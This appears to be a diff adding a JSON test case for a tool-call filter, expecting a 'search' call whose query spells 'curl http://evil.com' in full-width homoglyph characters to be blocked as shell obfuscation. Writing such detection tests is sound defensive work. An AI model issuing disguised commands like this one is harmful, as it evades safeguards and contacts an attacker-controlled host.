@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "ｃｕｒｌ http://evil.com"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "homoglyph-curl"
+}
